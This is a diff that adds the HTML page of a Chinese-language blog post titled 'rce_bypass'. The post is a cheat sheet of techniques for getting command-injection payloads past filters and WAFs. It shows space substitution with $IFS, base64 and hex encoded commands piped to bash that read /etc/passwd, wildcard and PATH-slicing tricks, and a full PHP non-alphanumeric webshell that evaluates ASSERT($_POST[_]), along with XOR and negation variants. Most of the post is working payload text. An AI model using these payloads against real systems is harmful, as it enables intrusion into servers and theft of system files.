@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>rce_bypass | A10ng_&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="空格绕过： 在bash下可以用$IFS、${IFS}、$IFS$9、%09、&lt;、&gt;、&lt;&gt;、{,}（例如{cat,/et">
+<meta name="author" content="admin">
+<link rel="canonical" href="https://a10nggg.github.io/archives/50/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://a10nggg.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://a10nggg.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://a10nggg.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://a10nggg.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://a10nggg.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://a10nggg.github.io/archives/50/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="rce_bypass" />
+<meta property="og:description" content="空格绕过： 在bash下可以用$IFS、${IFS}、$IFS$9、%09、&lt;、&gt;、&lt;&gt;、{,}（例如{cat,/et" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://a10nggg.github.io/archives/50/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-12-21T13:33:09+00:00" />
+<meta property="article:modified_time" content="2021-12-21T13:33:09+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="rce_bypass"/>
+<meta name="twitter:description" content="空格绕过： 在bash下可以用$IFS、${IFS}、$IFS$9、%09、&lt;、&gt;、&lt;&gt;、{,}（例如{cat,/et"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://a10nggg.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "rce_bypass",
+      "item": "https://a10nggg.github.io/archives/50/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "rce_bypass",
+  "name": "rce_bypass",
+  "description": "空格绕过： 在bash下可以用$IFS、${IFS}、$IFS$9、%09、\u0026lt;、\u0026gt;、\u0026lt;\u0026gt;、{,}（例如{cat,/et",
+  "keywords": [
+    
+  ],
+  "articleBody": "空格绕过： 在bash下可以用$IFS、${IFS}、$IFS$9、%09、\u003c、\u003e、\u003c\u003e、{,}（例如{cat,/etc/passwd} ）、%20(space)、%09(tab)。\n命令执行函数system()绕过（在URL请求中过滤system()函数） 系统命令函数system() passthru() exec() shell_exec() popen() proc_open() pcntl_exec() 反引号（·） 同shell_exec()用以上函数都可进行绕过。\n命令连接符： Windows和Linux都支持的命令连接符：\ncmd1 | cmd2 只执行cmd2\ncmd1 || cmd2 只有当cmd1执行失败后，cmd2才被执行\ncmd1 \u0026 cmd2 先执行cmd1，不管是否成功，都会执行cmd2\ncmd1 \u0026\u0026 cmd2 先执行cmd1，cmd1执行成功后才执行cmd2，否则不执行cmd2\nLinux还支持分号（;），cmd1;cmd2 按顺序依次执行，先执行cmd1再执行cmd2\n正则匹配绕过 1) 利用变量绕过 a=c;b=a;c=t;\n$a$b$c /etc/passwd\n2) 利用base编码绕过 echo ‘cat’ | base64\nY2F0wqAK\necho 'Y2F0wqAK' | base64 -d /etc/passwd\necho ‘Y2F0IC9ldGMvcGFzc3dk’ | base64 -d | bash// cat /etc/passwd\n3) 利用hex编码（十六进制）绕过 echo “636174202F6574632F706173737764” | xxd -r -p|bash// hex编码后的0x不需要输入。\n4) 利用oct编码（八进制）绕过 $(printf “\\154\\163”)//ls命令\n5)利用16进制编码绕过 “\\x73\\x79\\x73\\x74\\x65\\x6d”(“cat /etc/passwd”);\n5) 利用拼接绕过 (sy.(st).em)(whoami);//\nc’‘a’’t /etc/passwd//单引\nc\"“a\"“t /etc/passwd//双引\ncat /etc/passwd/反单引\nc\\a\\t /etc/passwd//反斜线\n$和$@，$x(x 代表 1-9),${x}(x\u003e=10) :比如ca${21}t a.txt表示cat a.txt 在没有传入参数的情况下,这些特殊字符默认为空,如下:\nwh$1oami\nwho$@ami\nwhoa$mi\n666whoami666 //bash: 666root666: command not found\n666\\whoami666 //bash: 666root666: command not found\n//命令执行后的结果在2个666中间\n插入注释（这对于绕过阻止特定PHP函数名称的WAF规则集很有用）\nsystem/A10ng/(whoami);\nsystem/A10ng/(wh./A10ng_/(oa)/caixukun/.mi);\n(sy./A10ng_/(st)/A10ng_/.em)/A10ng_/(wh./A10ng_/(oa)/A10ng_/.mi);\n6) 利用未初始化变量 cat$u /etc/passwd\n7) 利用未初始化变量，使用$u绕过 cat /etc$u/passwd\n8）过滤了斜杠‘/’ 可利用’;‘拼接命令绕过\ncd ..;cd ..;cd ..;cd ..;cd etc;cat passwd\n9)利用通配符绕过： 列如cat /passwd：\n??? /e??/?a????\ncat /e_/pa_\n10）glob通配符： 在glob里\n“ [A-Fa-f0-9] ”相当于 \" [ABCDEFabcdef0123456789] “.)\n“ [-%] ”代表“ [!”#$%] ”而“ [az] ”代表“任何 小写字母”\n利用[@-[]来表示大写字母： […]表示匹配方括号之中的任意一个字符 {…}表示匹配大括号里面的所有模式，模式之间使用逗号分隔。 {…}与[…]有一个重要的区别，当匹配的文件不存在，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开\ncat t[a-z]st\ncat t{a,b,c,d,e,f}st 利用PATH绕过 可以通过截断和拼接来得到我们想要的来getshell\n${PATH:5:1} //l\n${PATH:2:1} //s\n${PATH:5:1}${PATH:2:1} //拼接后是ls,执行命令\n${PATH:5:1}s //拼接后是ls,执行命令\n自增绕过： ‘a’++ =\u003e ‘b’，‘b’++ =\u003e ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。\n那么，如何拿到一个值为字符串’a’的变量呢？\n巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。\n例如：\n\u003c?php $_=[]; $_=@\"$_\"; // $_='Array'; $_=$_['!'=='@']; // $_=$_[0]; $___=$_; // A $__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___.=$__; // S $___.=$__; // S $__=$_; $__++;$__++;$__++;$__++; // E $___.=$__; $__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R $___.=$__; $__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T $___.=$__; $____='_'; $__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P $____.=$__; $__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O $____.=$__; $__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S $____.=$__; $__=$_; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T $____.=$__; $_=$$____; $___($_[_]); // ASSERT($_POST[_]); ## 异或绕过 def xor(): for i in range(0,128): for j in range(0,128): result=i^j print(chr(i)+' ^ '+chr(j)+' == \u003e '+chr(result)+\" ASCII:\"+str(result)) if \\_\\_name\\_\\_ == \"\\_\\_main\\_\\_\": xor() 先利用脚本将异或的组合列出来 \\[![\\](/uploads/2021/12/wp\\_editor\\_md\\_ae1bbc342dc4ecab0e1fea03ce105863.jpg)](/uploads/2021/12/wp\\_editor\\_md\\_ae1bbc342dc4ecab0e1fea03ce105863.jpg) 然后将需要的命令拼接出来。 列如：phpinfo() ('G'^'7/7.)!(')(); 其中'G'^'7'=p，'G'^'/'=h…………依次类推拼出你想得到的命令。 在有时候，字母和输入全被过滤掉的时候，可以用不可打印字符来进行命令执行。可以稍微改一下上边的脚本，将字符url编码之后再输出，这时候就能绕过去了。 \\### 取反绕过 取反跟异或原理上差不多，唯一不同的是运算的逻辑不一样,当然这跟我们半毛钱关系都没有，我们也不需要手算，我就是纯属凑个字数。 这个非常简单，就是把命令先取反，然后在上传的时候，加一个取反符号‘~’，再在服务器上进行一次取反运算， \u003c?php echo urlencode(~'phpinfo'); ?\u003e 得到取反的结果：%8F%97%8F%96%91%99%90\n例如phpinfo()就是：\n(~’%8F%97%8F%96%91%99%90’)();\n参考博客： https://man7.org/linux/man-pages/man7/glob.7.html\nhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html\nhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\nhttps://cloud.tencent.com/developer/article/1599149\nhttps://www.cnblogs.com/NPFS/p/13279815.html\nhttps://blog.csdn.net/weixin_39877898/article/details/112198269\n",
+  "wordCount" : "1694",
+  "inLanguage": "en",
+  "datePublished": "2021-12-21T13:33:09Z",
+  "dateModified": "2021-12-21T13:33:09Z",
+  "author":{
+    "@type": "Person",
+    "name": "admin"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://a10nggg.github.io/archives/50/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "A10ng_'s Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://a10nggg.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://a10nggg.github.io/" accesskey="h" title="A10ng_&#39;s Blog (Alt + H)">A10ng_&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://a10nggg.github.io/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/posts/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      rce_bypass
+    </h1>
+    <div class="post-meta"><span title='2021-12-21 13:33:09 +0000 +0000'>December 21, 2021</span>&nbsp;·&nbsp;admin
+
+</div>
+  </header> 
+  <div class="post-content"><h2 id="空格绕过">空格绕过：<a hidden class="anchor" aria-hidden="true" href="#空格绕过">#</a></h2>
+<p>在bash下可以用$IFS、${IFS}、$IFS$9、%09、&lt;、&gt;、&lt;&gt;、{,}（例如{cat,/etc/passwd} ）、%20(space)、%09(tab)。</p>
+<h2 id="命令执行函数system绕过在url请求中过滤system函数">命令执行函数system()绕过（在URL请求中过滤system()函数）<a hidden class="anchor" aria-hidden="true" href="#命令执行函数system绕过在url请求中过滤system函数">#</a></h2>
+<p>系统命令函数system() passthru() exec() shell_exec() popen() proc_open() pcntl_exec() 反引号（·） 同shell_exec()用以上函数都可进行绕过。</p>
+<h2 id="命令连接符">命令连接符：<a hidden class="anchor" aria-hidden="true" href="#命令连接符">#</a></h2>
+<p>Windows和Linux都支持的命令连接符：<br>
+cmd1 | cmd2 只执行cmd2<br>
+cmd1 || cmd2 只有当cmd1执行失败后，cmd2才被执行<br>
+cmd1 &amp; cmd2 先执行cmd1，不管是否成功，都会执行cmd2<br>
+cmd1 &amp;&amp; cmd2 先执行cmd1，cmd1执行成功后才执行cmd2，否则不执行cmd2<br>
+Linux还支持分号（;），cmd1;cmd2 按顺序依次执行，先执行cmd1再执行cmd2</p>
+<h3 id="正则匹配绕过">正则匹配绕过<a hidden class="anchor" aria-hidden="true" href="#正则匹配绕过">#</a></h3>
+<h3 id="1-利用变量绕过">1) 利用变量绕过<a hidden class="anchor" aria-hidden="true" href="#1-利用变量绕过">#</a></h3>
+<p>a=c;b=a;c=t;<br>
+$a$b$c /etc/passwd</p>
+<h3 id="2-利用base编码绕过">2) 利用base编码绕过<a hidden class="anchor" aria-hidden="true" href="#2-利用base编码绕过">#</a></h3>
+<p>echo &lsquo;cat&rsquo; | base64<br>
+Y2F0wqAK<br>
+<code>echo 'Y2F0wqAK' | base64 -d</code> /etc/passwd<br>
+echo &lsquo;Y2F0IC9ldGMvcGFzc3dk&rsquo; | base64 -d | bash// cat /etc/passwd</p>
+<h3 id="3-利用hex编码十六进制绕过">3) 利用hex编码（十六进制）绕过<a hidden class="anchor" aria-hidden="true" href="#3-利用hex编码十六进制绕过">#</a></h3>
+<p>echo &ldquo;636174202F6574632F706173737764&rdquo; | xxd -r -p|bash// hex编码后的0x不需要输入。</p>
+<h3 id="4-利用oct编码八进制绕过">4) 利用oct编码（八进制）绕过<a hidden class="anchor" aria-hidden="true" href="#4-利用oct编码八进制绕过">#</a></h3>
+<p>$(printf &ldquo;\154\163&rdquo;)//ls命令</p>
+<h3 id="5利用16进制编码绕过">5)利用16进制编码绕过<a hidden class="anchor" aria-hidden="true" href="#5利用16进制编码绕过">#</a></h3>
+<p>&ldquo;\x73\x79\x73\x74\x65\x6d&rdquo;(&ldquo;cat /etc/passwd&rdquo;);</p>
+<h3 id="5-利用拼接绕过">5) 利用拼接绕过<a hidden class="anchor" aria-hidden="true" href="#5-利用拼接绕过">#</a></h3>
+<p>(sy.(st).em)(whoami);//<br>
+c&rsquo;&lsquo;a&rsquo;&rsquo;t /etc/passwd//单引<br>
+c&quot;&ldquo;a&quot;&ldquo;t /etc/passwd//双引<br>
+c<code>a</code>t /etc/passwd/反单引<br>
+c\a\t /etc/passwd//反斜线<br>
+$<em>和$@，$x(x 代表 1-9),${x}(x&gt;=10) :比如ca${21}t a.txt表示cat a.txt 在没有传入参数的情况下,这些特殊字符默认为空,如下:<br>
+wh$1oami<br>
+who$@ami<br>
+whoa$<em>mi<br>
+666<code>whoami</code>666 //bash: 666root666: command not found<br>
+666<code>\whoami</code>666 //bash: 666root666: command not found<br>
+//命令执行后的结果在2个666中间<br>
+插入注释（这对于绕过阻止特定PHP函数名称的WAF规则集很有用）<br>
+system/<em>A10ng</em></em>/(whoami);<br>
+system/<em>A10ng</em></em>/(wh./<em>A10ng</em>_/(oa)/<em>caixukun</em>/.mi);<br>
+(sy./<em>A10ng</em>_/(st)/<em>A10ng</em>_/.em)/<em>A10ng</em>_/(wh./<em>A10ng</em>_/(oa)/<em>A10ng</em>_/.mi);</p>
+<h3 id="6-利用未初始化变量">6) 利用未初始化变量<a hidden class="anchor" aria-hidden="true" href="#6-利用未初始化变量">#</a></h3>
+<p>cat$u /etc/passwd</p>
+<h3 id="7-利用未初始化变量使用u绕过">7) 利用未初始化变量，使用$u绕过<a hidden class="anchor" aria-hidden="true" href="#7-利用未初始化变量使用u绕过">#</a></h3>
+<p>cat /etc$u/passwd</p>
+<h3 id="8过滤了斜杠">8）过滤了斜杠‘/’<a hidden class="anchor" aria-hidden="true" href="#8过滤了斜杠">#</a></h3>
+<p>可利用&rsquo;;&lsquo;拼接命令绕过<br>
+cd ..;cd ..;cd ..;cd ..;cd etc;cat passwd</p>
+<h3 id="9利用通配符绕过">9)利用通配符绕过：<a hidden class="anchor" aria-hidden="true" href="#9利用通配符绕过">#</a></h3>
+<p>列如cat /passwd：<br>
+??? /e??/?a????<br>
+cat /e_/pa_</p>
+<h3 id="10glob通配符">10）glob通配符：<a hidden class="anchor" aria-hidden="true" href="#10glob通配符">#</a></h3>
+<p>在glob里<br>
+“ [A-Fa-f0-9] ”相当于 &quot; [ABCDEFabcdef0123456789] &ldquo;.)<br>
+“ [-%] ”代表“ [!”#$%] ”而“ [az] ”代表“任何 小写字母”</p>
+<h2 id="利用-来表示大写字母">利用[@-[]来表示大写字母：<a hidden class="anchor" aria-hidden="true" href="#利用-来表示大写字母">#</a></h2>
+<ol>
+<li>[&hellip;]表示匹配方括号之中的任意一个字符</li>
+<li>{…}表示匹配大括号里面的所有模式，模式之间使用逗号分隔。</li>
+<li>{&hellip;}与[&hellip;]有一个重要的区别，当匹配的文件不存在，[&hellip;]会失去模式的功能，变成一个单纯的字符串，而{&hellip;}依然可以展开<br>
+cat t[a-z]st<br>
+cat t{a,b,c,d,e,f}st</li>
+</ol>
+<h2 id="利用path绕过">利用PATH绕过<a hidden class="anchor" aria-hidden="true" href="#利用path绕过">#</a></h2>
+<p>可以通过截断和拼接来得到我们想要的来getshell<br>
+${PATH:5:1} //l<br>
+${PATH:2:1} //s<br>
+${PATH:5:1}${PATH:2:1} //拼接后是ls,执行命令<br>
+${PATH:5:1}s //拼接后是ls,执行命令</p>
+<h2 id="自增绕过">自增绕过：<a hidden class="anchor" aria-hidden="true" href="#自增绕过">#</a></h2>
+<p>&lsquo;a&rsquo;++ =&gt; &lsquo;b&rsquo;，&lsquo;b&rsquo;++ =&gt; &lsquo;c&rsquo;&hellip; 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。<br>
+那么，如何拿到一个值为字符串&rsquo;a&rsquo;的变量呢？<br>
+巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。<br>
+例如：</p>
+<?php
+$_=[];
+$_=@"$_"; // $_='Array';
+$_=$_['!'=='@']; // $_=$_[0];
+$___=$_; // A
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
+$___.=$__; // S
+$___.=$__; // S
+$__=$_;
+$__++;$__++;$__++;$__++; // E 
+$___.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
+$___.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
+$___.=$__;
+
+$____='_';
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
+$____.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
+$____.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
+$____.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
+$____.=$__;
+
+$_=$$____;
+$___($_[_]); // ASSERT($_POST[_]);
+
+## 异或绕过
+def xor():
+    for i in range(0,128):
+        for j in range(0,128):
+            result=i^j
+            print(chr(i)+'  ^  '+chr(j)+' == > '+chr(result)+" ASCII:"+str(result))
+
+  
+if \_\_name\_\_ == "\_\_main\_\_":  
+xor()
+
+先利用脚本将异或的组合列出来  
+\[![\](/uploads/2021/12/wp\_editor\_md\_ae1bbc342dc4ecab0e1fea03ce105863.jpg)](/uploads/2021/12/wp\_editor\_md\_ae1bbc342dc4ecab0e1fea03ce105863.jpg)  
+然后将需要的命令拼接出来。  
+列如：phpinfo()  
+('G'^'7/7.)!(')();  
+其中'G'^'7'=p，'G'^'/'=h…………依次类推拼出你想得到的命令。  
+在有时候，字母和输入全被过滤掉的时候，可以用不可打印字符来进行命令执行。可以稍微改一下上边的脚本，将字符url编码之后再输出，这时候就能绕过去了。  
+\### 取反绕过  
+取反跟异或原理上差不多，唯一不同的是运算的逻辑不一样,当然这跟我们半毛钱关系都没有，我们也不需要手算，我就是纯属凑个字数。  
+这个非常简单，就是把命令先取反，然后在上传的时候，加一个取反符号‘~’，再在服务器上进行一次取反运算，  
+<?php
+echo urlencode(~'phpinfo');
+?>
+<p>得到取反的结果：%8F%97%8F%96%91%99%90<br>
+例如phpinfo()就是：<br>
+(~&rsquo;%8F%97%8F%96%91%99%90&rsquo;)();</p>
+<h5 id="参考博客">参考博客：<a hidden class="anchor" aria-hidden="true" href="#参考博客">#</a></h5>
+<p><a href="https://man7.org/linux/man-pages/man7/glob.7.html">https://man7.org/linux/man-pages/man7/glob.7.html</a><br>
+<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a><br>
+<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a><br>
+<a href="https://cloud.tencent.com/developer/article/1599149">https://cloud.tencent.com/developer/article/1599149</a><br>
+<a href="https://www.cnblogs.com/NPFS/p/13279815.html">https://www.cnblogs.com/NPFS/p/13279815.html</a><br>
+<a href="https://blog.csdn.net/weixin_39877898/article/details/112198269">https://blog.csdn.net/weixin_39877898/article/details/112198269</a></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2024 <a href="https://a10nggg.github.io/">A10ng_&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
